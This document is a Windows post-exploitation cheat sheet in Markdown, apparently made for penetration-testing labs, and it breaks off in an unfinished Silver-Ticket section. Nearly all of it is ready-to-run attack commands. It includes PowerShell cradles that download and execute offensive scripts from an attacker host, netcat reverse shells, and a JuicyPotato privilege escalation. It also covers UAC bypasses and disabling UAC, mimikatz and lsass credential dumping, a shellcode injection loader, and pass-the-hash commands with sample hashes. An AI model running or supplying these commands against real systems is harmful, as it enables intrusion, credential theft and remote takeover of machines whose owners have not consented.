
# Windows

## General Commands
```bash
net use z: \\$source_ip\$smb_share  
```
```bash
//$source_ip/$smb_share/tools_windows/bin/whoami.exe
```
```
netsh advfirewall firewall add rule name="forward_port_rule" prot ocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
netsh interface portproxy add v4tov4 listenport=4455 listenaddres s=10.11.0.22 connectport=445 connectaddress=192.168.1.110
```
```
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && e cho 10.5.5.%i is up.
```
## Enumeration Scripts
```bash
//$source_ip/$smb_share/tools_windows/windows-privesc-check2.exe --audit -a -o wpc-report
```
```bash
//$source_ip/$smb_share/tools_windows/windows-privesc-check2.exe --dump -a > wpc-dump
```
```bash
//$source_ip/$smb_share/tools_windows/winPEAS-64.exe
```
```bash
//$source_ip/$smb_share/tools_windows/winPEAS-86.exe
```
```bash
//$source_ip/$smb_share/tools_windows/winPEAS.bat
```
```bash
//$source_ip/$smb_share/tools_windows/WinPrivCheck.bat
```

```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Exfiltration/Get-GPPAutologon.ps1'); Get-GPPAutologon"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Exfiltration/Get-GPPPassword.ps1'); Get-GPPPassword"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Exfiltration/Get-VaultCredential.ps1'); Get-VaultCredential"
```

```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/JAWS/jaws-enum.ps1');"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/Privesc/privesc.ps1');"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/SessionGopher/SessionGopher.ps1'); Invoke-SessionGopher -Thorough"
```

Check if CMD or Powershell
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Copy and paste enum
```bash
echo "--------- BASIC WINDOWS RECON ---------"  > report.txt; timeout 1; systeminfo >> report.txt; timeout 1; set >> report.txt; timeout 1; echo %username% >> report.txt; timeout 1; echo %userdomain% >> report.txt; timeout 1; echo %path% >> report.txt; timeout 1; echo %cd% >> report.txt; timeout 1; netstat -r >> report.txt; timeout 1; nbtstat >> report.txt; timeout 1; whoami /priv >> report.txt; timeout 1; wmic OS get OSArchitecture >> report.txt; timeout 1; net config Workstation  >> report.txt; timeout 1; systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt; timeout 1; hostname >> report.txt; timeout 1; net users >> report.txt; timeout 1; ipconfig /all >> report.txt; timeout 1; route print >> report.txt; timeout 1; arp -A >> report.txt; timeout 1; netstat -ano >> report.txt; timeout 1; netsh firewall show state >> report.txt; timeout 1; netsh firewall show config >> report.txt; timeout 1; schtasks /query /fo LIST /v >> report.txt; timeout 1; tasklist /SVC >> report.txt; timeout 1; net start >> report.txt; timeout 1; DRIVERQUERY >> report.txt; timeout 1; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt; timeout 1; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt; timeout 1; dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt; timeout 1; findstr /si password *.xml *.ini *.txt >> report.txt; timeout 1; reg query HKLM /f password /t REG_SZ /s >> report.txt; timeout 1; reg query HKCU /f password /t REG_SZ /s >> report.txt; timeout 1; dir "C:\"; timeout 1; dir "C:\Program Files\" >> report.txt; timeout 1; dir "C:\Program Files (x86)\" >> report.txt; timeout 1; dir "C:\Users\" >> report.txt; timeout 1; dir "C:\Users\Public\" >> report.txt; timeout 1; fsutil fsinfo drives >> report.txt; timeout 1; dir "c:\windows\repair\" >> report.txt; timeout 1; echo "REPORT COMPLETE!"
```

File associations:
```bash
assoc
ftype powershellfile="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
```
```
//$source_ip/$smb_share/tools_windows/EyeWitness.exe 
```

Firewall rules:
```
netsh advfirewall firewall show rule name=all
```

### General Enumeration

List files everyone can modify
```
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
Mounted and unmounted volumes:
```
mountvol
```
Device drivers and kernel modules:
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```
```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, D riverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

Running services:
```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

Permission check:
```
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
```

Check service status:
```
wmic service where caption="Serviio" get name, caption, state, startmode
```

### Domain Enumeration

#### AD domain name 
```
nslookup
> set type=all
> _ldap._tcp.dc._msdcs.example.local
```
#### ShareFinder - Look for shares on network and check access under current user context & Log to file

```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
```
### Import PowerView Module
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Recon/PowerView.ps1')"
```

### Invoke-BloodHound for domain recon
```bash
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
```

### ADRecon script to generate XLSX file of domain properties
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')"
```

## Exploit Suggesters
```bash
python.exe //$source_ip/$smb_share/tools_windows/windows-exploit-suggester.py
```
```bash
//$source_ip/$smb_share/tools_windows/Watson_Net35.exe
```
```bash
//$source_ip/$smb_share/tools_windows/Watson_Net45.exe
```
```bash
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -exec Bypass -C "iex ((New-Object System.Net.WebClient).DownloadString('http://$source_ip/tools_windows/Sherlock.ps1'))"
```
```bash
cd tools_windows/Windows-Exploit-Suggester; python windows-exploit-suggester.py --database `ls -la 20* | cut -d' ' -f9 | sort -nr | head -n 1` --systeminfo systeminfo.txt
```
```bash
//$source_ip/$smb_share/tools_windows/Privesc/privesc.bat
```

## Exploit

MS16-032
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/exploits_windows_collections/windows-kernel-exploits/MS16-032/MS16-032.ps1'); Invoke-MS16-032"
```

Invoke-HotPotato Exploit
```bash
powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1');invoke-Tater -Command 'net localgroup Administrators user /add'"
```
```
//$source_ip/$smb_share/exploits_windows_prevesc/juicypotato.exe -p c:\windows\system32\cmd.exe -l 1340 -t * -a "/c //$source_ip/$smb_share/tools_windows/bin/nc.exe -nc $source_ip $source_port -e cmd.exe"
```

ScStoragePathFromUrl
```bash
python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target_ip $pwd/public/payloads_windows/shell_reverse_tcp_x86_shikata_ga_nai.bin
```


## Reverse shell
```bash
//$source_ip/$smb_share/payloads_windows/shell_reverse_tcp_x86_shikata_ga_nai.exe
```
```bash
//$source_ip/$smb_share/payloads_windows/shell_reverse_tcp_x64_shikata_ga_nai.exe
```
```bash
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -C "iex ((New-Object System.Net.WebClient).DownloadString('http://$source_ip/tools_windows/nishang/Shells/Invoke-PowerShellTcp.ps1'))"
```

## Bypass UAC 
Bypass UAC and launch PowerShell window as admin
```bash
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
```
Disable UAC:
```bash
reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system reg setval -v EnableLUA -d 0 -t REG_DWORD -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system
```

UAC Bypass 
```powershell
$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
$RegPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"

New-Item $RegPath -Force | Out-Null
Set-ItemProperty -Path $RegPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null

$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden -PassThru
$Process.WaitForExit()

if (Test-Path $RegPath) {
  Remove-Item $RegPath -Recurse -Force
}
```

fodhelper.exe (Windows 10 1709)
<https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/>
<https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/>
```
SysinternalsSuite> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v Delega teExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.e xe" /f
C:\Windows\System32\fodhelper.exe
```

## Password Dumping
```bash
//$source_ip/$smb_share/tools_windows/bin/fgdump/fgdump.exe
```
```bash
//$source_ip/$smb_share/tools_windows/wce.exe
```
```bash
privilege::debug
sekurlsa::logonPasswords full
sekurlsa::wdigest
```
```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
```
```bash
//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "sekurlsa::logonpasswords full" "sekurlsa::wdigest" exit
```
```bash
//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "lsadump::lsa /patch" "lsadump::sam" exit
```
```bash
//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "token::elevate" "lsadump::sam" exit
```
```bash
//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```
```bash
//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "kerberos::list /export" exit
tgsrepcrack.py wordlist.txt 1-40a50000-Offse c@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```
```bash
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
```
Invoke-MassMimikatz
```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
```
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:demodomain /user:sqladmin"'
```
```bash 
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```
```bash
//$source_ip/$smb_share/tools_windows/pstools/procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```bash
//$source_ip/$smb_share/tools_windows/pstools/procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```


```bash
reg.exe save hklm\sam c:\sam_backup reg.exe save hklm\security c:\security_backup reg.exe save hklm\system c:\system
```

### cpasswords in sysvol
```
findstr /S cpassword %logonserver%\sysvol\*.xml
```
```
findstr /S cpassword $env:logonserver\sysvol\*.xml
```
```bash
//$source_ip/$smb_share/tools_windows/gp3finder.exe -A -l
```
```bash
//$source_ip/$smb_share/tools_windows/gp3finder.exe -A -t DOMAIN_CONTROLLER -u DOMAIN\USER
```

## Kerberos

### Invoke-Kerberoast with Hashcat Output
```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"
```

### Inveigh

#### Start inveigh using Basic Auth - logging to file
```bash
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -HTTPAuth Basic"
```

#### Start inveigh in silent mode (no popups)
```bash
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -WPADAuth anonymous"
```

## Network monitoring
```bash
//$source_ip/$smb_share/tools_windows/tcpdump.exe -s 0 -w tcpdump.out
```
```bash
//$source_ip/$smb_share/tools_windows/tcpdump.exe port 80 -s 0 -w tcpdump.out 
```
```bash
//$source_ip/$smb_share/tools_windows/tcpdump.exe net 10.10.10.0/24 -s 0 -w tcpdump.out 
```
```bash
//$source_ip/$smb_share/tools_windows/tcpdump.exe host 10.10.10.10 -s 0 -w tcpdump.out 
```

## Service Permissions 

### Find service unquote paths
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """
```
```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

### Services with write access
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwcqv * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwcqv * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwcqv * /accepteula
```

### Services with write access to user testuser
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwcqv "testuser" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwcqv "testuser" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwcqv "testuser" * /accepteula
```

### Services with write access for Authenticated Users
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwcqv "Authenticated Users" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwcqv "Authenticated Users" * /accepteula
```

### Services with write access for Everyone
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwcqv "Everyone" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwcqv "Everyone" * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwcqv "Everyone" * /accepteula
```

### Services details for all services
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -ucqv * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -ucqv * /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -ucqv * /accepteula
```

### Services details for Spooler
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -ucqv Spooler /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -ucqv Spooler /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -ucqv Spooler /accepteula
```

### Change service using registry

```
Set-Location 'HKLM:\SYSTEM\CurrentControlSet'
$acl = Get-Acl 'HKLM:\SYSTEM\CurrentControlset\Services'
$acl.Access
 
$idRef = [System.Security.Principal.NTAccount]("domain\user")
$regRights = [System.Security.AccessControl.RegistryRights]::FullControl
$inhFlags = [System.Security.AccessControl.InheritanceFlags]::None
$prFlags = [System.Security.AccessControl.PropagationFlags]::None
$acType = [System.Security.AccessControl.AccessControlType]::Allow
$rule = New-Object System.Security.AccessControl.RegistryAccessRule ($idRef, $regRights, $inhFlags, $prFlags, $acType)
$acl.AddAccessRule($rule)

$acl | Set-Acl -Path 'HKLM:\SYSTEM\CurrentControlset\Services'
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\Services\wuauserv" -Name ImagePath -Value "//$source_ip/$smb_share/tools_windows/bin/nc.exe $source_ip $source_port -e c:\windows\system32\cmd.exe"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\Services\wuauserv" -Name Start -Value "2"

sc.exe qc wuauserv
sc.exe stop wuauserv
sc.exe start wuauserv
```

## File Permissions

### File permissions (s for recursive)
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -udqs "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -udqs "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -udqs "C:\" /accepteula
```

### Write access to directories for Users
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwdqs "Users" "C:" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwdqs "Users" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwdqs "Users" "C:\" /accepteula
```

### Write access to file for Users
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwdqs "Users" "C:" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwdqs "Users" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwdqs "Users" "C:\" /accepteula
```

### Write access to file for Authenticated Users
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwdqs "Authenticated Users" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwdqs "Authenticated Users" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwdqs "Authenticated Users" "C:\" /accepteula
```

### Write access to file for Everyone
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -uwdqs "Everyone" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2003-xp.exe -uwdqs "Everyone" "C:\" /accepteula
```
```bash
//$source_ip/$smb_share/tools_windows/accesschk-2008-vista.exe -uwdqs "Everyone" "C:\" /accepteula
```

### List file with explicit integrity levels 
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -e -s c:\users\mark /accepteula
```

## Registry Permissions

### Registry keys under Hhklm\software user has write access to
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -kws user hklm\software /accepteula
```
### Security of hklm\software
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -k hklm\software  /accepteula
```

### Global objects everyone can modify
```bash
//$source_ip/$smb_share/tools_windows/accesschk.exe -wuo Everyone \basednamedobjects /accepteula
```

## Download file
```bash
//$source_ip/$smb_share/tools_windows/bin/wget.exe http://$source_ip/tools_windows/bin/nc.exe
```
```bash
certutil -urlcache -split -f http://$source_ip/tools_windows/bin/nc.exe
```
```bash
mshta http://$source_ip/tools_windows/bin/nc.exe
```
```bash
bitsadmin /transfer badthings http://$source_ip/tools_windows/bin/nc.exe c:\nc.exe
```
Copy and paste downloader < Windows 10
```bash
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
cscript dl.vbs "http://$source_ip/tools_windows/bin/nc.exe" "nc.exe"
```

Copy and paste downloader >= Windows 10
```bash
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
cscript dl.vbs "http://$source_ip/tools_windows/bin/nc.exe" "nc.exe"
```
```bash
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -C "(New-Object System.Net.WebClient).DownloadFile('http://$source_ip/tools_windows/bin/nc.exe','C:\nc.exe')"
```

```powershell
IEX("New-Object System.Net.WebClient).DownloadFile('http://$source_ip/tools_windows/bin/nc.exe','C:\nc.exe')")
```

Python:
```bash
python -c "import urllib.request; urllib.request.urlretrieve('http://$source_ip/tools_windows/bin/nc.exe', 'C:\\nc.exe');"
```
 
Perl:
```bash
perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://$source_ip/tools_windows/bin/nc.exe'); my $file = $ff->fetch() or die $ff->error;"

```

```
echo open $source_ip 21> ftp.txt
echo USER offsec>> ftp.txt # username
echo ftp>> ftp.txt # password
echo bin>> ftp.txt # binary mode
echo GET [file]>> ftp.txt
echo bye>> ftp.txt
ftp -v -n -s:ftp.txt
```
```
echo open $source_ip 21>ftp.txt&echo USER offsec>>ftp.txt&echo ftp>>ftp.txt&echo bin>>ftp.txt&echo GET [file]>>ftp.txt&echo bye>>ftp.txt&ftp -v -n -s:ftp.txt
```
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
cscript wget.vbs http://$source_ip/[file] [file]
```

```
echo $storageDir = $pwd >wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://$source_ip/[file]" >>wget.ps1
echo $file = "[file]" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

```
upx -9 [.exe] # pack and compress a binary you wanna transfer
ls -lah [.exe] # check whether it is less than 64kb
exe2hex [.exe] # alternatively, `wine /usr/share/windows-binaries/exe2bat.exe [.exe] [.bat]`
cat [.bat] | xclip -selection c # if remotely accessing kali, use `ssh -X`, a bit finicky though
```

In memory shell code execution with Powershell:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
```
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat ionType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc =
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc = <place your shellcode here>;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc [$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

## Copy windows binaries
```bash
copy //$source_ip/$smb_share/tools_windows/bin/Regexe.exe
```
```bash
copy //$source_ip/$smb_share/tools_windows/bin/regedit.exe
```
```bash
copy //$source_ip/$smb_share/tools_windows/bin/nc.exe
```
```bash
copy //$source_ip/$smb_share/tools_windows/bin/wget.exe
```
```bash
copy //$source_ip/$smb_share/tools_windows/bin/whoami.exe
```

## Using Credentia
```
while read USER; do echo $USER && smbmap -H 10.10.10.172 -u "$USER" -p "$USER"; done < usernames 
``` 

```powershell
$username = '<username here>'
$password = '<password here>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securepassword
Start-Process '//$source_ip/$smb_share/tools_windows/bin/nc.exe' -ArgumentList '-e cmd.exe $source_ip $source_port' -Credential $credential -NoNewWindow
```
```powershell
$username = '<username here>'
$password = '<password here>'
computer = '<hostname>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securepassword
[System.Diagnostics.Process]::Start('//$source_ip/$smb_share/tools_windows/bin/nc.exe','-e cmd.exe $source_ip $source_port', $credential.Username, $credential.Password, $computer)
```
```bash
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
```
Requires .Net 3.5
```powershell
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = '<username here>'; $password = '<password here>'; $computer = $env:COMPUTERNAME; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer); $obj.ValidateCredentials($username, $password); }"
```
Requires .Net 2.0
```powershell
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = '<username here>'; $password = '<password here>'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Windows\System32\calc.exe -NoNewWindow -Credential $credential; }"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/Invoke-TheHash/Invoke-WMIExec.ps1'); Invoke-WMIExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose"
```
```bash
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/Invoke-TheHash/Invoke-SMBExec.ps1'); Invoke-SMBExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose"
```

```bash
//$source_ip/$smb_share/tools_windows/pstools/PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd
```

```bash
runas /profile /user:administrator cmd
```

```bash 
START /B cmd.exe
```

```bash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a //$target cmd.exe
```

Convert NTLM hash into a Kerberos TGT (overpass the hash) and then use the TGT to access remote machine
(We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.)
```bash
sekurlsa::pth /user:Administrateur /domain:<domain> /ntlm:cc36cf7a8514893efccd332446158b1a /run:PowerShell.exe
```
```
.\PsExec.exe \\dc01 cmd.exe
```

Pass the Ticket attack takes advantage of the TGS
Silver-Ticket 
```
